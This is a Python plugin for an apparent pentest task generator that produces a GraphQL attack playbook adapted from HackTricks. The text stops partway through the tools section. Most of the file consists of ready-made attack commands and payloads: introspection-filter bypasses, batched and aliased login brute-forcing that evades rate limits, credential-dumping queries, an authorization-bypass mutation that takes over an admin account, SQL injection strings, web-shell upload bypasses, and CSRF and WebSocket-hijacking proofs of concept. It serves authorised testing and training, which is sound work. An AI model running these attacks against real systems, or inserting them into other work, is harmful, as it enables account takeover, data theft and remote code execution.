"""
GraphQL API enumeration and exploitation plugin

Generates tasks for GraphQL endpoint enumeration including:
- Endpoint discovery via common paths
- Schema introspection (multiple bypass techniques)
- Fingerprinting GraphQL engine
- Query/mutation enumeration
- Authorization testing
- DoS vulnerability detection
- CSRF/WebSocket hijacking tests

Extracted from HackTricks: pentesting-web/graphql.md
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class GraphQLPlugin(ServicePlugin):
    """GraphQL API enumeration and exploitation plugin"""

    @property
    def name(self) -> str:
        return "graphql"

    @property
    def default_ports(self) -> List[int]:
        return [80, 443, 8080, 8443, 3000, 4000]

    @property
    def service_names(self) -> List[str]:
        return ['http', 'https', 'http-proxy', 'ssl/http']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """
        Detect GraphQL services

        GraphQL typically runs on HTTP/HTTPS ports
        Actual detection happens via endpoint discovery tasks
        """
        service = port_info.get('service', '').lower()
        port = port_info.get('port', 0)

        # Check for HTTP services
        if any(svc in service for svc in ['http', 'ssl', 'web']):
            return True

        # Check common web ports
        if port in self.default_ports:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate GraphQL enumeration task tree"""

        # Determine if HTTPS
        service = service_info.get('service', '').lower()
        protocol = 'https' if 'ssl' in service or 'https' in service or port == 443 else 'http'
        base_url = f"{protocol}://{target}:{port}"

        tasks = {
            'id': f'graphql-enum-{port}',
            'name': f'GraphQL API Enumeration (Port {port})',
            'type': 'parent',
            'children': []
        }

        # PHASE 1: Discovery
        discovery_tasks = {
            'id': f'graphql-discovery-{port}',
            'name': 'GraphQL Endpoint Discovery',
            'type': 'parent',
            'children': []
        }

        # Task 1.1: Common path enumeration
        common_paths = ['/graphql', '/graphiql', '/graphql.php', '/graphql/console',
                       '/api', '/api/graphql', '/graphql/api', '/graphql/graphql']

        discovery_tasks['children'].append({
            'id': f'graphql-path-enum-{port}',
            'name': 'Enumerate Common GraphQL Paths',
            'type': 'command',
            'metadata': {
                'command': f'for path in /graphql /graphiql /graphql.php /graphql/console /api /api/graphql /graphql/api /graphql/graphql; do echo "Testing: {base_url}$path"; curl -s -X POST -H "Content-Type: application/json" -d \'{{\"query\":\"{{__typename}}\"}}\' {base_url}$path | grep -E \'"data"|"__typename"\' && echo "[+] Found GraphQL at: {base_url}$path"; done',
                'description': 'Test common GraphQL endpoint paths with universal query',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM', 'MANUAL'],
                'flag_explanations': {
                    'curl': 'HTTP client for making requests',
                    '-s': 'Silent mode (hide progress)',
                    '-X POST': 'Use POST method (GraphQL default)',
                    '-H "Content-Type: application/json"': 'Specify JSON content type',
                    '-d': 'POST data payload',
                    'query{__typename}': 'Universal GraphQL query (returns "Query" if valid endpoint)',
                    'grep -E': 'Search for response indicators (data/__typename fields)'
                },
                'success_indicators': [
                    'Response contains {"data": {"__typename": "Query"}}',
                    'Valid JSON response with "data" field',
                    'HTTP 200 status with GraphQL structure'
                ],
                'failure_indicators': [
                    'HTTP 404 Not Found',
                    'HTTP 405 Method Not Allowed',
                    'Empty response or HTML error page',
                    'Connection timeout'
                ],
                'next_steps': [
                    'Note all discovered GraphQL endpoints',
                    'Test each endpoint for introspection',
                    'Fingerprint GraphQL engine version',
                    'Attempt schema enumeration'
                ],
                'alternatives': [
                    f'Manual: curl -X POST {base_url}/graphql -H "Content-Type: application/json" -d \'{{\"query\":\"{{__typename}}\"}}\'',
                    f'Gobuster: gobuster dir -u {base_url} -w /usr/share/wordlists/graphql-paths.txt',
                    'Browser: Navigate to /graphiql for interactive console',
                    'ffuf: ffuf -u {base_url}/FUZZ -w graphql-wordlist.txt -mc 200'
                ],
                'notes': 'The __typename query is universal and works on all GraphQL implementations. If you find /graphiql, you have an interactive console for testing.',
                'estimated_time': '30-60 seconds'
            }
        })

        # Task 1.2: Fingerprint GraphQL engine
        discovery_tasks['children'].append({
            'id': f'graphql-fingerprint-{port}',
            'name': 'Fingerprint GraphQL Engine',
            'type': 'command',
            'metadata': {
                'command': f'graphw00f -t {base_url}/graphql',
                'description': 'Identify GraphQL engine and version for CVE research',
                'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'ENUM'],
                'flag_explanations': {
                    'graphw00f': 'GraphQL fingerprinting tool',
                    '-t': 'Target URL to fingerprint'
                },
                'success_indicators': [
                    'Engine identified (Apollo, Hasura, GraphQL-Java, etc.)',
                    'Version number detected',
                    'Helpful security information displayed'
                ],
                'failure_indicators': [
                    'Unable to fingerprint',
                    'Connection error',
                    'Tool not installed'
                ],
                'next_steps': [
                    'Search engine version for known CVEs',
                    'Check for version-specific exploits',
                    'Review engine-specific security features'
                ],
                'alternatives': [
                    f'Manual: curl -v {base_url}/graphql -X POST -d \'{{\"query\":\"{{__schema{{types{{name}}}}}}\"}}\'',
                    'Analyze HTTP headers for engine hints',
                    'Review error messages for version leaks',
                    'Install: git clone https://github.com/dolevf/graphw00f'
                ],
                'notes': 'Fingerprinting helps identify CVE-2024-47614 (async-graphql), CVE-2024-40094 (graphql-java), and other version-specific bugs'
            }
        })

        tasks['children'].append(discovery_tasks)

        # PHASE 2: Introspection
        introspection_tasks = {
            'id': f'graphql-introspection-{port}',
            'name': 'GraphQL Schema Introspection',
            'type': 'parent',
            'children': []
        }

        # Task 2.1: Basic introspection
        introspection_tasks['children'].append({
            'id': f'graphql-basic-introspection-{port}',
            'name': 'Basic Schema Introspection',
            'type': 'command',
            'metadata': {
                'command': f'curl -X POST {base_url}/graphql -H "Content-Type: application/json" -d \'{{\"query\":\"{{__schema{{types{{name,fields{{name}}}}}}}}\"}}\' | jq .',
                'description': 'Extract type and field names from GraphQL schema',
                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM'],
                'flag_explanations': {
                    '__schema': 'GraphQL introspection root field',
                    'types': 'All types defined in schema',
                    'name': 'Type/field name',
                    'fields': 'Fields within each type',
                    'jq .': 'Pretty-print JSON response'
                },
                'success_indicators': [
                    'JSON response with types array',
                    'Custom types revealed (User, Admin, Flag, etc.)',
                    'Field names displayed for each type'
                ],
                'failure_indicators': [
                    'Introspection disabled (empty/error response)',
                    'HTTP 400 Bad Request',
                    'Error: "introspection is disabled"'
                ],
                'next_steps': [
                    'Analyze custom types (User, Admin, etc.)',
                    'Map relationships between types',
                    'Identify sensitive fields (password, token, secret)',
                    'Try full introspection query for complete schema'
                ],
                'alternatives': [
                    f'Manual: Open {base_url}/graphiql and run introspection query',
                    'Use GraphQL Voyager to visualize schema',
                    'Try introspection bypass techniques if blocked',
                    'GraphiQL browser extension with introspection'
                ],
                'notes': 'If introspection works, you have complete schema visibility - massive OSCP win',
                'estimated_time': '10-15 seconds'
            }
        })

        # Task 2.2: Full introspection with arguments
        introspection_tasks['children'].append({
            'id': f'graphql-full-introspection-{port}',
            'name': 'Full Introspection (With Arguments)',
            'type': 'command',
            'metadata': {
                'command': f'curl -X POST {base_url}/graphql -H "Content-Type: application/json" -d \'{{\"query\":\"{{__schema{{types{{name,fields{{name,args{{name,description,type{{name,kind,ofType{{name,kind}}}}}}}}}}}}}}\"}}\' | jq . > graphql-schema-full.json',
                'description': 'Extract complete schema including field arguments and types',
                'tags': ['OSCP:HIGH', 'ENUM'],
                'flag_explanations': {
                    'args': 'Arguments required for each field',
                    'description': 'Field/argument descriptions',
                    'type': 'Data type information',
                    'kind': 'Type kind (OBJECT, SCALAR, LIST, etc.)',
                    'ofType': 'Nested type reference',
                    '> graphql-schema-full.json': 'Save to file for analysis'
                },
                'success_indicators': [
                    'Complete schema saved to JSON file',
                    'Arguments revealed for queryable fields',
                    'Type relationships mapped'
                ],
                'failure_indicators': [
                    'Introspection blocked',
                    'Partial schema (missing args)',
                    'Error about query complexity'
                ],
                'next_steps': [
                    'Analyze schema file for sensitive queries',
                    'Identify mutation operations (create/update/delete)',
                    'Map authentication requirements',
                    'Build custom queries based on schema'
                ],
                'alternatives': [
                    'Use InQL Burp extension to auto-generate queries',
                    'GraphQL Voyager for visual schema exploration',
                    'Manual query construction from partial schema',
                    'Try clairvoyance if introspection disabled'
                ],
                'notes': 'This query reveals HOW to query each field - critical for building exploits',
                'estimated_time': '15-30 seconds'
            }
        })

        # Task 2.3: Introspection bypass techniques
        introspection_tasks['children'].append({
            'id': f'graphql-introspection-bypass-{port}',
            'name': 'Introspection Bypass Techniques',
            'type': 'parent',
            'children': [
                {
                    'id': f'graphql-introspection-newline-{port}',
                    'name': 'Bypass: Newline After __schema',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -X POST {base_url}/graphql -H "Content-Type: application/json" -d \'{{\"query\":\"query{{__schema\\n{{queryType{{name}}}}}}\"}}\' | jq .',
                        'description': 'Bypass regex-based introspection blocking with newline',
                        'tags': ['OSCP:MEDIUM', 'BYPASS', 'QUICK_WIN'],
                        'flag_explanations': {
                            '\\n': 'Newline character after __schema',
                            'Bypass mechanism': 'Regex often blocks "__schema" but misses "__schema\\n"'
                        },
                        'success_indicators': [
                            'Schema data returned',
                            'queryType revealed'
                        ],
                        'failure_indicators': [
                            'Still blocked',
                            'Same error as before'
                        ],
                        'alternatives': [
                            'Try space instead: "__schema {{queryType}}"',
                            'Try comma: "__schema,{queryType}"',
                            'Use GET method instead of POST',
                            'Try x-www-form-urlencoded content-type'
                        ]
                    }
                },
                {
                    'id': f'graphql-introspection-get-{port}',
                    'name': 'Bypass: GET Method',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl "{base_url}/graphql?query={{__schema{{queryType{{name}}}}}}" | jq .',
                        'description': 'Try GET request if POST is blocked',
                        'tags': ['OSCP:MEDIUM', 'BYPASS'],
                        'flag_explanations': {
                            '?query=': 'GraphQL query in URL parameter',
                            'GET vs POST': 'Rate limits/filters often only apply to POST'
                        },
                        'success_indicators': [
                            'Schema returned via GET',
                            'No introspection error'
                        ],
                        'alternatives': [
                            'Try POST with x-www-form-urlencoded',
                            'WebSocket connection to GraphQL',
                            'Use clairvoyance for blind schema extraction'
                        ]
                    }
                },
                {
                    'id': f'graphql-websocket-introspection-{port}',
                    'name': 'Bypass: WebSocket Connection',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Connect via WebSocket to bypass WAF/filters',
                        'tags': ['OSCP:LOW', 'BYPASS', 'ADVANCED'],
                        'alternatives': [
                            'Browser console: ws = new WebSocket("wss://{target}:{port}/graphql", "graphql-ws")',
                            'Send introspection via ws.send(JSON.stringify({{type:"GQL.START",payload:{{query:"{{__schema{{types{{name}}}}}}"}}}})',
                            'Manual WebSocket tools: wscat, websocat'
                        ],
                        'notes': 'WebSocket connections often bypass HTTP-based WAFs and rate limiters'
                    }
                }
            ]
        })

        tasks['children'].append(introspection_tasks)

        # PHASE 3: Schema Reconstruction (If Introspection Disabled)
        no_introspection_tasks = {
            'id': f'graphql-no-introspection-{port}',
            'name': 'Schema Reconstruction (No Introspection)',
            'type': 'parent',
            'children': []
        }

        # Task 3.1: Clairvoyance
        no_introspection_tasks['children'].append({
            'id': f'graphql-clairvoyance-{port}',
            'name': 'Blind Schema Discovery (Clairvoyance)',
            'type': 'command',
            'metadata': {
                'command': f'clairvoyance -o schema.json {base_url}/graphql',
                'description': 'Reconstruct GraphQL schema from error messages without introspection',
                'tags': ['OSCP:MEDIUM', 'ENUM', 'AUTOMATED'],
                'flag_explanations': {
                    'clairvoyance': 'Tool that reconstructs GraphQL schema from error messages',
                    '-o': 'Output file for discovered schema',
                    'How it works': 'Sends malformed queries and analyzes error responses'
                },
                'success_indicators': [
                    'Schema.json file created',
                    'Types and fields discovered',
                    'Partial or complete schema reconstructed'
                ],
                'failure_indicators': [
                    'No useful errors returned',
                    'Tool not installed',
                    'Errors disabled on endpoint'
                ],
                'next_steps': [
                    'Analyze reconstructed schema',
                    'Identify queryable fields',
                    'Test discovered mutations'
                ],
                'alternatives': [
                    'Manual: Send invalid queries and read error messages',
                    'GraphQuail Burp extension (passive schema building)',
                    'Search JavaScript source for embedded queries',
                    'Install: pip install clairvoyance'
                ],
                'notes': 'Clairvoyance is OSCP-friendly as it teaches manual schema discovery via error analysis',
                'estimated_time': '2-5 minutes'
            }
        })

        # Task 3.2: JavaScript source analysis
        no_introspection_tasks['children'].append({
            'id': f'graphql-js-search-{port}',
            'name': 'Extract Queries from JavaScript',
            'type': 'manual',
            'metadata': {
                'description': 'Find preloaded GraphQL queries in client-side JavaScript',
                'tags': ['OSCP:HIGH', 'MANUAL', 'QUICK_WIN'],
                'alternatives': [
                    'Browser DevTools: Sources tab → "Search all files"',
                    'Search patterns: "mutation", "query", "fragment"',
                    f'wget -r -l 1 {base_url} && grep -r "mutation\\|query" .',
                    'Burp: Proxy history → Search → "query {"'
                ],
                'success_indicators': [
                    'GraphQL queries found in .js files',
                    'Mutation operations discovered',
                    'Schema fragments revealed'
                ],
                'next_steps': [
                    'Extract all queries and mutations',
                    'Test queries in /graphiql or curl',
                    'Modify queries to test authorization'
                ],
                'notes': 'Client-side code often contains complete queries - huge OSCP win for manual enumeration',
                'estimated_time': '5-10 minutes'
            }
        })

        # Task 3.3: GraphQL wordlist fuzzing
        no_introspection_tasks['children'].append({
            'id': f'graphql-field-fuzzing-{port}',
            'name': 'Field/Type Fuzzing (Wordlist)',
            'type': 'command',
            'metadata': {
                'command': f'ffuf -u {base_url}/graphql -X POST -H "Content-Type: application/json" -d \'{{\"query\":\"{{FUZZ{{}}}}\"}}\' -w /usr/share/wordlists/graphql-entities.txt -mc 200 -fw 0',
                'description': 'Brute-force GraphQL field names when introspection disabled',
                'tags': ['OSCP:LOW', 'ENUM', 'BRUTE_FORCE', 'NOISY'],
                'flag_explanations': {
                    'ffuf': 'Fast web fuzzer',
                    '-X POST': 'HTTP POST method',
                    'FUZZ': 'Placeholder for wordlist substitution',
                    '-w': 'Wordlist path',
                    '-mc 200': 'Match HTTP 200 responses',
                    '-fw 0': 'Filter out responses with 0 words (errors)'
                },
                'success_indicators': [
                    'Valid field names discovered',
                    'HTTP 200 responses with data',
                    'Error messages revealing field structure'
                ],
                'failure_indicators': [
                    'All 400 errors (no valid fields)',
                    'Rate limiting triggered',
                    'WAF blocking requests'
                ],
                'alternatives': [
                    'Wordlist: https://github.com/Escape-Technologies/graphql-wordlist',
                    'Manual: Test common names (users, user, admin, flags, config)',
                    'Burp Intruder with GraphQL wordlist',
                    'graphql-path-enum tool'
                ],
                'notes': 'Noisy and time-consuming - use only when other methods fail',
                'estimated_time': '5-15 minutes'
            }
        })

        tasks['children'].append(no_introspection_tasks)

        # PHASE 4: Query Exploitation
        query_tasks = {
            'id': f'graphql-query-exploitation-{port}',
            'name': 'Query Exploitation',
            'type': 'parent',
            'children': []
        }

        # Task 4.1: Dump all data with empty string
        query_tasks['children'].append({
            'id': f'graphql-empty-string-dump-{port}',
            'name': 'Empty String Dump Attack',
            'type': 'manual',
            'metadata': {
                'description': 'Query with empty string to dump all records',
                'tags': ['OSCP:MEDIUM', 'QUICK_WIN', 'EXPLOIT'],
                'alternatives': [
                    f'curl -X POST {base_url}/graphql -d \'{{\"query\":\"{{users(description:\\\"\\\"){{username,password}}}}\"}}\' -H "Content-Type: application/json"',
                    'Example: {users(name:""){email}} → Returns all users',
                    'Works when filter fields accept empty strings',
                    'Try on all filterable fields discovered in schema'
                ],
                'success_indicators': [
                    'All records returned in response',
                    'Bulk data dump',
                    'Sensitive information exposed'
                ],
                'failure_indicators': [
                    'Empty result set',
                    'Validation error',
                    'Null response'
                ],
                'next_steps': [
                    'Extract credentials from dump',
                    'Map user relationships',
                    'Test discovered credentials for auth'
                ],
                'notes': 'Simple but effective - tests if empty string bypasses filtering logic'
            }
        })

        # Task 4.2: Parameter injection/enumeration
        query_tasks['children'].append({
            'id': f'graphql-param-enum-{port}',
            'name': 'Parameter Enumeration via Errors',
            'type': 'manual',
            'metadata': {
                'description': 'Discover valid parameters by analyzing error messages',
                'tags': ['OSCP:HIGH', 'MANUAL', 'ENUM'],
                'alternatives': [
                    'Test invalid field: {user(uid:1){noExists}} → Error reveals valid fields',
                    'Error message: "Cannot query field noExists on type User. Did you mean: username, password?"',
                    'Brute-force IDs: {user(uid:1)}, {user(uid:2)}, etc.',
                    'Test type mismatches to discover field types'
                ],
                'success_indicators': [
                    'Error messages reveal field names',
                    'Valid IDs/records found via brute-force',
                    'Type information leaked'
                ],
                'next_steps': [
                    'Query discovered fields',
                    'Enumerate all valid IDs',
                    'Test for IDOR vulnerabilities'
                ],
                'notes': 'GraphQL error messages are extremely verbose - use this for manual enumeration in OSCP'
            }
        })

        # Task 4.3: Batching attack for rate limit bypass
        query_tasks['children'].append({
            'id': f'graphql-batching-bruteforce-{port}',
            'name': 'Batching Attack (Brute-force)',
            'type': 'command',
            'metadata': {
                'command': f'curl -X POST {base_url}/graphql -H "Content-Type: application/json" -d \'[{{\"query\":\"mutation{{login(user:\\"admin\\",pass:\\"pass1\\"){{token}}}}\"}},{{\"query\":\"mutation{{login(user:\\"admin\\",pass:\\"pass2\\"){{token}}}}\"}},{{\"query\":\"mutation{{login(user:\\"admin\\",pass:\\"pass3\\"){{token}}}}\"}}]\'',
                'description': 'Send multiple authentication attempts in single request to bypass rate limits',
                'tags': ['OSCP:MEDIUM', 'BRUTE_FORCE', 'BYPASS'],
                'flag_explanations': {
                    'Array of queries': 'GraphQL batching feature - multiple operations per request',
                    'login mutation': 'Authentication mutation',
                    'Bypass mechanism': 'Rate limiters count HTTP requests, not operations within request'
                },
                'success_indicators': [
                    'One mutation returns valid token',
                    'Valid credentials discovered',
                    'No rate limiting triggered'
                ],
                'failure_indicators': [
                    'All mutations return null',
                    'Batching disabled',
                    'Account lockout'
                ],
                'next_steps': [
                    'Extract successful credentials',
                    'Test token for authenticated access',
                    'Expand batch size for larger wordlists'
                ],
                'alternatives': [
                    'Use batchql tool: batchql -u {base_url}/graphql -w passwords.txt',
                    'Generate batch payloads with Python script',
                    'InQL Burp extension (Attacker mode)'
                ],
                'notes': 'Batching can send 1000s of auth attempts in one request - powerful OSCP technique',
                'estimated_time': 'Varies by batch size'
            }
        })

        # Task 4.4: Alias-based brute-force
        query_tasks['children'].append({
            'id': f'graphql-alias-bruteforce-{port}',
            'name': 'Alias-based Rate Limit Bypass',
            'type': 'command',
            'metadata': {
                'command': f'curl -X POST {base_url}/graphql -H "Content-Type: application/json" -d \'{{\"query\":\"query{{code1:isValidDiscount(code:1){{valid}} code2:isValidDiscount(code:2){{valid}} code3:isValidDiscount(code:3){{valid}}}}\"}}\' | jq .',
                'description': 'Use aliases to test multiple values in single request',
                'tags': ['OSCP:MEDIUM', 'BRUTE_FORCE', 'BYPASS'],
                'flag_explanations': {
                    'Alias syntax': 'code1:isValidDiscount allows multiple same-field queries',
                    'Single HTTP request': 'Bypasses HTTP request-based rate limiters',
                    'Multiple values': 'Test discount codes, IDs, tokens in one request'
                },
                'success_indicators': [
                    'Valid codes/values discovered',
                    'Multiple results in single response',
                    'No rate limiting'
                ],
                'failure_indicators': [
                    'All results negative',
                    'Alias count limit enforced',
                    'Query complexity error'
                ],
                'alternatives': [
                    'Generate with script: for i in range(1000): print(f"alias{i}:isValid(code:{i}){{valid}}")',
                    'Combine with batching for even more requests',
                    'Use GraphQL automation tools'
                ],
                'notes': 'Aliases bypass rate limiters that count HTTP requests but not operations'
            }
        })

        tasks['children'].append(query_tasks)

        # PHASE 5: Mutation Testing
        mutation_tasks = {
            'id': f'graphql-mutation-testing-{port}',
            'name': 'Mutation Testing (Write Operations)',
            'type': 'parent',
            'children': []
        }

        # Task 5.1: Discover mutations
        mutation_tasks['children'].append({
            'id': f'graphql-mutation-discovery-{port}',
            'name': 'Discover Available Mutations',
            'type': 'command',
            'metadata': {
                'command': f'curl -X POST {base_url}/graphql -H "Content-Type: application/json" -d \'{{\"query\":\"{{__schema{{mutationType{{name,fields{{name,description,args{{name,type{{name}}}}}}}}}}}}\"}}\' | jq . > mutations.json',
                'description': 'Extract all mutation operations from schema',
                'tags': ['OSCP:HIGH', 'ENUM'],
                'flag_explanations': {
                    'mutationType': 'Root mutation type containing all write operations',
                    'fields': 'All available mutations (create, update, delete, etc.)',
                    'args': 'Required arguments for each mutation'
                },
                'success_indicators': [
                    'Mutations list saved to file',
                    'Create/Update/Delete operations found',
                    'Sensitive mutations discovered (addAdmin, deleteUser)'
                ],
                'failure_indicators': [
                    'No mutations defined',
                    'Introspection blocked',
                    'Empty mutationType'
                ],
                'next_steps': [
                    'Test each mutation for authorization',
                    'Try creating test records',
                    'Attempt privilege escalation via mutations'
                ],
                'alternatives': [
                    'Manual: Review mutations.json from full introspection',
                    'GraphiQL: Explore mutations in sidebar',
                    'JavaScript source: Search for "mutation {"'
                ],
                'notes': 'Mutations are critical - they modify data. Focus OSCP time here.',
                'estimated_time': '10-20 seconds'
            }
        })

        # Task 5.2: Authorization bypass testing
        mutation_tasks['children'].append({
            'id': f'graphql-mutation-authz-{port}',
            'name': 'Mutation Authorization Bypass',
            'type': 'manual',
            'metadata': {
                'description': 'Test mutations without authentication or with low-privilege user',
                'tags': ['OSCP:HIGH', 'EXPLOIT', 'AUTHZ'],
                'alternatives': [
                    'Test: mutation{updateProfile(username:"admin",email:"attacker@evil.com"){success}}',
                    'IDOR: Change other user data by modifying ID/username parameter',
                    'Privilege escalation: addAdmin mutation with low-priv user',
                    'Chain queries: {forgotPassword(email:"admin@corp.com") register(user:"attacker",pass:"pwned")}'
                ],
                'success_indicators': [
                    'Mutation succeeds without auth',
                    'Other user data modified',
                    'Admin account created',
                    'Privilege escalation achieved'
                ],
                'failure_indicators': [
                    'Authorization error',
                    'Authentication required',
                    'Insufficient permissions'
                ],
                'next_steps': [
                    'Document authorization bypass',
                    'Attempt account takeover',
                    'Test all mutations for weak authz'
                ],
                'notes': 'GraphQL often checks authentication but NOT authorization - test every mutation'
            }
        })

        # Task 5.3: Query chaining bypass
        mutation_tasks['children'].append({
            'id': f'graphql-query-chaining-{port}',
            'name': 'Query Chaining Authorization Bypass',
            'type': 'manual',
            'metadata': {
                'description': 'Chain operations together to bypass weak authentication',
                'tags': ['OSCP:MEDIUM', 'BYPASS', 'EXPLOIT'],
                'alternatives': [
                    'Example: {operationName:"forgotPassword",query:"mutation forgotPassword{...} mutation register{...}"}',
                    'Server expects only forgotPassword but executes both',
                    'Chain authenticated + unauthenticated operations',
                    'Test all mutation combinations'
                ],
                'success_indicators': [
                    'Secondary operation executes',
                    'Authentication bypass achieved',
                    'Unexpected mutation succeeds'
                ],
                'next_steps': [
                    'Document bypass technique',
                    'Test all sensitive mutations',
                    'Chain for maximum impact'
                ],
                'notes': 'Weak operation parsers may execute all queries, not just operationName'
            }
        })

        tasks['children'].append(mutation_tasks)

        # PHASE 6: DoS/Security Testing
        security_tasks = {
            'id': f'graphql-security-testing-{port}',
            'name': 'Security & DoS Testing',
            'type': 'parent',
            'children': []
        }

        # Task 6.1: Run graphql-cop
        security_tasks['children'].append({
            'id': f'graphql-cop-{port}',
            'name': 'Automated Vulnerability Scan (graphql-cop)',
            'type': 'command',
            'metadata': {
                'command': f'graphql-cop -t {base_url}/graphql',
                'description': 'Test for common GraphQL misconfigurations and vulnerabilities',
                'tags': ['OSCP:MEDIUM', 'AUTOMATED', 'VULN_SCAN'],
                'flag_explanations': {
                    'graphql-cop': 'GraphQL security scanner',
                    '-t': 'Target GraphQL endpoint',
                    'Tests': 'Introspection, batching, DoS, field duplication, aliases, etc.'
                },
                'success_indicators': [
                    'Vulnerabilities detected',
                    'Misconfigurations found',
                    'DoS vectors identified'
                ],
                'failure_indicators': [
                    'All tests passed',
                    'Tool not installed',
                    'Connection error'
                ],
                'next_steps': [
                    'Manually verify each finding',
                    'Exploit identified vulnerabilities',
                    'Test DoS in safe manner'
                ],
                'alternatives': [
                    'Install: git clone https://github.com/dolevf/graphql-cop && cd graphql-cop && pip install -r requirements.txt',
                    'Manual: Test each vuln type individually',
                    'InQL scanner mode',
                    'GraphCrawler toolkit'
                ],
                'notes': 'graphql-cop automates many manual tests - good for time-saving in OSCP',
                'estimated_time': '1-3 minutes'
            }
        })

        # Task 6.2: CSRF testing
        security_tasks['children'].append({
            'id': f'graphql-csrf-{port}',
            'name': 'CSRF Vulnerability Testing',
            'type': 'manual',
            'metadata': {
                'description': 'Test if GraphQL mutations are vulnerable to CSRF',
                'tags': ['OSCP:LOW', 'CSRF', 'WEB'],
                'alternatives': [
                    'Check: Does endpoint accept x-www-form-urlencoded POST?',
                    'Check: Does endpoint accept GET requests?',
                    'Check: Is CSRF token validated?',
                    'Check: SameSite cookie attribute (Lax/Strict blocks CSRF)',
                    'PoC: <form action="{base_url}/graphql" method="POST"><input name="query" value="mutation{...}"></form>'
                ],
                'success_indicators': [
                    'Mutation executes from third-party site',
                    'No CSRF token required',
                    'GET method accepted for mutations'
                ],
                'failure_indicators': [
                    'CSRF token validated',
                    'SameSite=Strict cookie',
                    'JSON-only endpoint (requires preflight)'
                ],
                'next_steps': [
                    'Create CSRF PoC for sensitive mutations',
                    'Test with victim session',
                    'Document CSRF chain'
                ],
                'notes': 'GraphQL CSRF is low-priority for OSCP but good for real-world pentests'
            }
        })

        # Task 6.3: CVE research
        security_tasks['children'].append({
            'id': f'graphql-cve-research-{port}',
            'name': 'GraphQL Engine CVE Research',
            'type': 'manual',
            'metadata': {
                'description': 'Research known CVEs for identified GraphQL engine',
                'tags': ['OSCP:HIGH', 'RESEARCH'],
                'alternatives': [
                    'searchsploit graphql',
                    'searchsploit <engine> <version> (from graphw00f results)',
                    'CVE-2024-47614: async-graphql < 7.0.10 (directive DoS)',
                    'CVE-2024-40094: graphql-java depth bypass',
                    'CVE-2023-23684: WPGraphQL SSRF→RCE',
                    'GitHub: Search engine repo for security advisories'
                ],
                'success_indicators': [
                    'Known CVE identified for engine version',
                    'Public exploit available',
                    'Vulnerability confirmed'
                ],
                'next_steps': [
                    'Test CVE PoC against endpoint',
                    'Adapt exploit if needed',
                    'Document successful exploit'
                ],
                'notes': 'Version-specific CVEs are OSCP gold - always fingerprint first'
            }
        })

        tasks['children'].append(security_tasks)

        # PHASE 7: Advanced Exploitation
        advanced_tasks = {
            'id': f'graphql-advanced-{port}',
            'name': 'Advanced Exploitation',
            'type': 'parent',
            'children': []
        }

        # Task 7.1: SQL injection via GraphQL
        advanced_tasks['children'].append({
            'id': f'graphql-sqli-{port}',
            'name': 'SQL Injection via GraphQL Arguments',
            'type': 'manual',
            'metadata': {
                'description': 'Test GraphQL arguments for SQL injection',
                'tags': ['OSCP:MEDIUM', 'SQLI', 'EXPLOIT'],
                'alternatives': [
                    'Test: {user(id:"1\' OR 1=1--"){username}}',
                    'Test: {users(filter:"admin\' UNION SELECT...--"){data}}',
                    'Error-based: Inject \' and observe SQL errors',
                    'Time-based: {user(id:"1\' AND SLEEP(5)--"){data}}'
                ],
                'success_indicators': [
                    'SQL errors in GraphQL response',
                    'Boolean-based: Data changes with true/false conditions',
                    'Time-based: Response delayed',
                    'UNION injection successful'
                ],
                'failure_indicators': [
                    'No SQL errors',
                    'Parameterized queries prevent injection',
                    'Input validation blocks payloads'
                ],
                'next_steps': [
                    'Use sqlmap against vulnerable parameter',
                    'Extract database schema',
                    'Dump credentials'
                ],
                'notes': 'GraphQL arguments often pass directly to SQL - test every field that accepts input'
            }
        })

        # Task 7.2: File upload mutations
        advanced_tasks['children'].append({
            'id': f'graphql-file-upload-{port}',
            'name': 'File Upload Mutation Testing',
            'type': 'manual',
            'metadata': {
                'description': 'Test file upload mutations for arbitrary file upload',
                'tags': ['OSCP:MEDIUM', 'UPLOAD', 'EXPLOIT'],
                'alternatives': [
                    'Look for: mutation{uploadFile, uploadAvatar, uploadDocument}',
                    'Test: Upload web shell (shell.php, shell.jsp)',
                    'Bypass: Change MIME type to image/jpeg',
                    'Bypass: Double extensions (shell.php.jpg)',
                    'Bypass: Null byte (shell.php%00.jpg)'
                ],
                'success_indicators': [
                    'File uploaded successfully',
                    'Web shell accessible',
                    'Path traversal works (../../uploads/shell.php)',
                    'RCE achieved'
                ],
                'failure_indicators': [
                    'File type validation',
                    'Upload disabled',
                    'Cannot access uploaded file'
                ],
                'next_steps': [
                    'Access uploaded shell',
                    'Establish reverse shell',
                    'Escalate privileges'
                ],
                'notes': 'File uploads are OSCP win conditions - prioritize these mutations'
            }
        })

        # Task 7.3: WebSocket hijacking
        advanced_tasks['children'].append({
            'id': f'graphql-websocket-hijack-{port}',
            'name': 'Cross-site WebSocket Hijacking',
            'type': 'manual',
            'metadata': {
                'description': 'Test WebSocket GraphQL for session hijacking',
                'tags': ['OSCP:LOW', 'WEBSOCKET', 'ADVANCED'],
                'alternatives': [
                    'Check: Does GraphQL use WebSocket subscriptions?',
                    'Check: Are cookies used for WebSocket auth?',
                    'PoC: Create malicious site that opens WebSocket to victim endpoint',
                    'Execute: Victim visits site → WebSocket opens with their cookies → Attacker queries/mutates'
                ],
                'success_indicators': [
                    'WebSocket connection succeeds from third-party origin',
                    'User session maintained over WebSocket',
                    'Mutations execute with victim privileges'
                ],
                'notes': 'Advanced topic - low priority for OSCP but exists in modern GraphQL stacks'
            }
        })

        tasks['children'].append(advanced_tasks)

        # PHASE 8: Tools & Automation
        tools_tasks = {
            'id': f'graphql-tools-{port}',
            'name': 'Automated Tools & Scanners',
            'type': 'parent',
            'children': []
        }

        # Task 8.1: InQL scanner
        tools_tasks['children'].append({
            'id': f'graphql-inql-{port}',
            'name': 'InQL Scanner (Auto-generate Queries)',
            'type': 'command',
            'metadata': {
                'command': f'inql -t {base_url}/graphql -o inql-output',
                'description': 'Auto-generate all possible queries and mutations from schema',
                'tags': ['OSCP:MEDIUM', 'AUTOMATED', 'ENUM'],
